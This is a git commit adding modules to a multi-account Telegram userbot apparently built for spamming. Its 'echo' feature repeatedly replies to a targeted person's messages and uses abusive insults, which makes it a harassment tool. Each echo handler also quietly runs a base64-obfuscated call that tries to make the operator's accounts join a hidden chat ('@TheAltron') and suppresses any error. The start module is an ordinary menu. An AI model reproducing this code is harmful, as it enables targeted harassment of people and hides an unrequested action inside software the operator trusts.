3ae7393a6be4cbfefc7449e6f6f338af6b460e70
RAJNISH XD <155803358+doraemon890@users.noreply.github.com>
2024-02-11 22:24:45 +0530

    Add files via upload

---
+++ JARVIS/modules/echo.py
@@ -0,0 +1,107 @@
+import asyncio
+import base64
+
+from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
+from JARVIS.data import FRIDAY
+
+ECHO = []
+
+
+@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+@X10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
+async def echo(event):
+    if event.sender_id in SUDO_USERS:
+        if event.reply_to_msg_id:
+            reply_msg = await event.get_reply_message()
+            user_id = reply_msg.sender_id
+
+            if user_id in FRIDAY:
+                await event.reply("BSDK...BAAP HU TERA.")
+            elif user_id == OWNER_ID:
+                await event.reply("BETA...BAAP PAR ECHO NHI KRTE...")
+            elif user_id in SUDO_USERS:
+                await event.reply("YE BHI JARVIS KA BACHA HAI ISPE ECHO MAT MARO.. !!.")
+            else:
+                try:
+                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                    await event.client(alt)
+                except BaseException:
+                    pass
+
+                global ECHO
+                check = f"{user_id}_{event.chat_id}"
+                if check in ECHO:
+                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR !!")
+                else:
+                    ECHO.append(check)
+                    await event.reply("» ECHO ACTIVATED HAI ISS CHUTIYE PAR ✅")
+        else:
+            await event.reply(f"𝗘𝗰𝗵𝗼:\n  » {hl}echo <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
+
+
+@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@X10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+async def rmecho(event):
+    if event.sender_id in SUDO_USERS:
+        if event.reply_to_msg_id:
+            try:
+                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+                await event.client(alt)
+            except BaseException:
+                pass
+
+            global ECHO
+            reply_msg = await event.get_reply_message()
+            check = f"{reply_msg.sender_id}_{event.chat_id}"
+
+            if check in ECHO:
+                ECHO.remove(check)
+                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !! ☑️")
+            else:
+                await event.reply("» ECHO STOP HO GYA ISS USER PR.. !!")
+        else:
+            await event.reply(f"𝗥𝗲𝗺𝗼𝘃𝗲 𝗘𝗰𝗵𝗼:\n  » {hl}rmecho <ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴜꜱᴇʀ>")
+
+
+@X1.on(events.NewMessage(incoming=True))
+@X2.on(events.NewMessage(incoming=True))
+@X3.on(events.NewMessage(incoming=True))
+@X4.on(events.NewMessage(incoming=True))
+@X5.on(events.NewMessage(incoming=True))
+@X6.on(events.NewMessage(incoming=True))
+@X7.on(events.NewMessage(incoming=True))
+@X8.on(events.NewMessage(incoming=True))
+@X9.on(events.NewMessage(incoming=True))
+@X10.on(events.NewMessage(incoming=True))
+async def _(e):
+    global ECHO
+    check = f"{e.sender_id}_{e.chat_id}"
+    if check in ECHO:
+        try:
+            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
+            await e.client(alt)
+        except BaseException:
+            pass
+        if e.message.text or e.message.sticker:
+            await e.reply(e.message)
+            await asyncio.sleep(0.1)
+                                                                                                                             
---
+++ JARVIS/modules/start.py
@@ -0,0 +1,46 @@
+from telethon import __version__, events, Button
+
+from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10
+
+
+START_BUTTON = [
+    [
+        Button.inline("• ᴄᴏᴍᴍᴀɴᴅs •", data="help_back")
+    ],
+    [
+        Button.url("• ᴄʜᴀɴɴᴇʟ •", "https://t.me/CDX_WORLD"),
+        Button.url("• sᴜᴘᴘᴏʀᴛ •", "https://t.me/BWANDARLOK")
+    ],
+    [
+        Button.url("• ʀᴇᴘᴏ •", "https://github.com/ANNIEemon890/JARVIS-X-SPAM")
+    ]
+]
+
+
+@X1.on(events.NewMessage(pattern="/start"))
+@X2.on(events.NewMessage(pattern="/start"))
+@X3.on(events.NewMessage(pattern="/start"))
+@X4.on(events.NewMessage(pattern="/start"))
+@X5.on(events.NewMessage(pattern="/start"))
+@X6.on(events.NewMessage(pattern="/start"))
+@X7.on(events.NewMessage(pattern="/start"))
+@X7.on(events.NewMessage(pattern="/start"))
+@X8.on(events.NewMessage(pattern="/start"))
+@X9.on(events.NewMessage(pattern="/start"))
+@X10.on(events.NewMessage(pattern="/start"))
+async def start(event):              
+    if event.is_private:
+        ANNIE = await event.client.get_me()
+        bot_name = ANNIE.first_name
+        bot_id = ANNIE.id
+        TEXT = f"**ʜᴇʏ​ [{event.sender.first_name}](tg://user?id={event.sender.id}),\n\nɪ ᴀᴍ [{bot_name}](tg://user?id={bot_id})​**\n━━━━━━━━━━━━━━━━━━━\n\n"
+        TEXT += f"» **ᴍʏ ᴅᴇᴠᴇʟᴏᴘᴇʀ​ : [JARVIS](https://t.me/jarvis2O)**\n\n"
+        TEXT += f"» **ᴊᴀʀᴠɪs V2 :** `M 1.8.31`\n"
+        TEXT += f"» **ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ :** `3.11.3`\n"
+        TEXT += f"» **ᴛᴇʟᴇᴛʜᴏɴ ᴠᴇʀsɪᴏɴ :** `{__version__}`\n━━━━━━━━━━━━━━━━━"
+        await event.client.send_file(
+              event.chat_id,
+                    "https://telegra.ph/file/83db3b7786ffa9948962b.jpg",
+                    caption=TEXT, 
+                    buttons=START_BUTTON
+                )
